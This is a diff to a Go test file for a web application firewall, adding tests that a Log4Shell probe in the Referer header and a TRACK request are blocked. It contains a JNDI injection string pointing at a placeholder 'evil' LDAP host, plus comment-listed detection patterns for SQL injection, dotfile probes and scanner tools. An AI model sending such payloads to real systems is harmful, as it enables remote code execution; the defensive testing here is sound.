@@ -17,6 +17,8 @@ import (
 //   dotfile-probe block  /.env /.git/ ...
 //   sqli-basic    challenge  UNION SELECT / ' or 1=1 ...
 //   scanner-ua    block  sqlmap nikto ...
+//   log4shell     block  ${jndi: in query/ua/referer/x-forwarded-for
+//   trace-method  deny   methods TRACE, TRACK
 //
 // Every request from the test host shares the Docker gateway source IP, so a
 // `block` action places a behavioural block on that IP. Tests that trigger a
@@ -90,6 +92,45 @@ func TestWAFScannerUABlock(t *testing.T) {
 		t.Error("sqlmap UA did not place a behavioural block")
 	} else if !strings.Contains(reason, "scanner-ua") {
 		t.Errorf("block reason = %q, want scanner-ua", reason)
+	}
+}
+
+// TestWAFHeaderRule confirms a header-targeting rule fires through real Angie:
+// the auth subrequest inherits the client's request headers, so a Log4Shell
+// probe hidden in the Referer (log4shell rule, header:referer target) is
+// denied and the source IP blocked, even though path, query and UA are clean.
+func TestWAFHeaderRule(t *testing.T) {
+	t.Cleanup(clearGatewayBlocks)
+	clearGatewayBlocks()
+
+	resp := get(t, "/products", powHost, "curl/8.0",
+		map[string]string{"Referer": "https://example.com/?x=${jndi:ldap://evil/a}"})
+	if resp.StatusCode != http.StatusForbidden {
+		t.Fatalf("jndi referer: status %d, want 403", resp.StatusCode)
+	}
+	if ip, reason := findBlockedGateway(t); ip == "" {
+		t.Error("jndi referer did not place a behavioural block")
+	} else if !strings.Contains(reason, "log4shell") {
+		t.Errorf("block reason = %q, want log4shell", reason)
+	}
+}
+
+// TestWAFMethodRule confirms a methods-only rule fires through real Angie via
+// the X-Guardian-Method relay (the auth subrequest itself is always a GET).
+// TRACK is used because Angie rejects TRACE at parse time with its own 405
+// before Guardian ever sees it; TRACK is not special-cased and passes through.
+func TestWAFMethodRule(t *testing.T) {
+	t.Cleanup(clearGatewayBlocks)
+
+	h := map[string]string{"Host": powHost, "User-Agent": "curl/8.0"}
+	resp := req(t, "TRACK", site+"/anything", h, nil)
+	if resp.StatusCode != http.StatusForbidden {
+		t.Fatalf("TRACK: status %d, want 403 (trace-method rule)", resp.StatusCode)
+	}
+	// The same URL with a normal method is untouched (deny, not block).
+	clearGatewayBlocks()
+	if r := get(t, "/anything", powHost, "curl/8.0", nil); r.StatusCode != http.StatusOK {
+		t.Fatalf("GET after TRACK deny: status %d, want 200", r.StatusCode)
 	}
 }
 
